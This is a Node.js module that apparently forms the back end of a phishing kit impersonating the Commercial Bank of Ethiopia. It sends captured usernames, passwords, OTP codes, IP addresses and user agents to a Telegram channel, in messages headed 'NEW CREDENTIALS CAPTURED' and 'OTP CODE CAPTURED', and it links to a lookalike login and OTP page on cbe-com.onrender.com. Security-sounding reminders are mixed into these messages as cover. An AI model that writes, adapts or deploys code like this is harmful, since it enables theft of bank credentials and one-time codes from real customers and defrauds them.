const logger = require('./logger');

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.chatId = null;
        this.channelId = null;
        this.channelUsername = null;
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            const channelId = process.env.TELEGRAM_CHANNEL_ID;
            const channelUsername = process.env.TELEGRAM_CHANNEL_USERNAME;

            if (!token) {
                logger.warn('Telegram token not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: false });
            this.chatId = chatId;
            
            if (channelId) {
                this.channelId = channelId;
                logger.info(`✅ Channel ID: ${channelId}`);
            } else if (channelUsername) {
                this.channelUsername = channelUsername;
                this.channelId = channelUsername;
                logger.info(`✅ Channel Username: ${channelUsername}`);
            }
            
            this.enabled = true;
            logger.info('✅ Telegram bot initialized with channel support');
            
        } catch (error) {
            logger.warn(`Telegram initialization failed: ${error.message}`);
            this.enabled = false;
        }
    }

    // Send to channel with detailed error logging
    async sendChannelPost(message, options = {}) {
        if (!this.enabled) {
            console.log('❌ Telegram is disabled');
            return null;
        }

        if (!this.bot) {
            console.log('❌ Bot not initialized');
            return null;
        }

        // Try multiple channel identifiers
        const channelIds = [
            this.channelId,
            this.channelUsername,
            process.env.TELEGRAM_CHANNEL_ID,
            process.env.TELEGRAM_CHANNEL_USERNAME
        ].filter(id => id);

        if (channelIds.length === 0) {
            console.log('❌ No channel ID configured');
            return null;
        }

        console.log(`📤 Attempting to post to ${channelIds.length} channel(s)`);

        for (const channelId of channelIds) {
            try {
                console.log(`📤 Trying: ${channelId}`);
                
                const result = await this.bot.sendMessage(channelId, message, {
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    ...options
                });
                
                console.log(`✅ Successfully posted to channel: ${channelId}`);
                this.channelId = channelId;
                return result;
                
            } catch (error) {
                console.log(`❌ Failed to post to ${channelId}: ${error.message}`);
                if (error.response) {
                    console.log('📊 Error details:', error.response.body);
                }
            }
        }
        
        console.log('❌ All channel posting attempts failed');
        return null;
    }

    // Send login page info with button
    async sendLoginPageInfo() {
        if (!this.enabled) return null;

        const message = `
🏦 <b>CBE SECURITY VERIFICATION PORTAL</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 PAGE DETAILS:</b>
• <b>Title:</b> Commercial Bank of Ethiopia
• <b>System:</b> Security Verification System
• <b>Purpose:</b> Account Verification

<b>🔐 SECURITY FEATURES:</b>
• ✅ Secure Connection (SSL)
• ✅ Verified Identity Check
• ✅ Advanced Encryption (AES-256)
• ✅ OTP Verification
• ✅ Session Management

<b>🛡️ SECURITY TIPS:</b>
  1. Always verify the URL before logging in
  2. Never share your OTP with anyone
  3. Use a strong, unique password
  4. Enable 2FA for your account
  5. Log out after each session

<pre>═══════════════════════════════════════</pre>
🕐 <i>Alert: ${new Date().toISOString()}</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔐 Open Login Page',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ],
                    [
                        {
                            text: '🛡️ Security Info',
                            callback_data: 'security_info'
                        },
                        {
                            text: '📱 OTP Page',
                            url: 'https://cbe-com.onrender.com/otp-verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    // Send login page accessed alert
    async sendLoginPageAccessed(data) {
        if (!this.enabled) return null;
        
        const message = `
🛡️ <b>CBE SECURITY MONITOR</b>
<pre>═══════════════════════════════════════</pre>

<b>🌐 LOGIN PAGE ACCESSED</b>

📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🌍 <b>Location:</b> ${data.location || 'Unknown'}
⏰ <b>Time:</b> ${data.timestamp}
🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}

<pre>═══════════════════════════════════════</pre>

⚠️ <b>SECURITY REMINDER:</b>
• Always verify user identity
• Enable 2FA for all accounts
• Monitor suspicious login attempts

<pre>═══════════════════════════════════════</pre>
🔐 <i>Click the button below to access the login page</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔐 Open Login Page',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    // Send credentials alert
    async sendCredentials(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 NEW CREDENTIALS CAPTURED</b>

👤 <b>Username:</b> <code>${data.username}</code>
🔑 <b>Password:</b> <code>${data.password}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🆔 <b>ID:</b> <code>${data.id}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>🔐 SECURE LOGIN REMINDER:</b>
   • Use strong passwords (12+ chars)
   • Enable 2FA for this account
   • Monitor for unusual activity
   • Change password if compromised

⚠️ <b>Action Required:</b> Investigate immediately
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔐 Open Login Page',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    // Send OTP alert
    async sendOTP(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 OTP CODE CAPTURED</b>

🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP Code:</b> <code>${data.otp}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>🔐 OTP SECURITY TIPS:</b>
   • OTP expires in 5 minutes
   • Never share OTP with anyone
   • Only enter OTP on secure pages

⚠️ <b>Action Required:</b> Verify OTP authenticity
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '📱 Enter OTP',
                            url: 'https://cbe-com.onrender.com/otp-verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    // Send welcome message
    async sendWelcomeMessage() {
        if (!this.enabled || !this.channelId) return null;
        
        const message = `
🚀 <b>CBE SECURITY SYSTEM ONLINE</b>
<pre>═══════════════════════════════════════</pre>

✅ System started successfully
📡 Monitoring active
🛡️ Security protocols engaged

<b>🔐 LOGIN PAGE SECURITY ACTIVE:</b>
   • Brute force protection: ✅
   • IP monitoring: ✅
   • Rate limiting: ✅
   • 2FA support: ✅
   • Session management: ✅

<pre>═══════════════════════════════════════</pre>

<b>📌 SECURITY REMINDER:</b>
   • Secure your login page
   • Monitor all attempts
   • Enable MFA
   • Stay vigilant

<pre>═══════════════════════════════════════</pre>
🔐 <i>All systems operational</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔐 Open Login Page',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }
}

module.exports = new TelegramService();
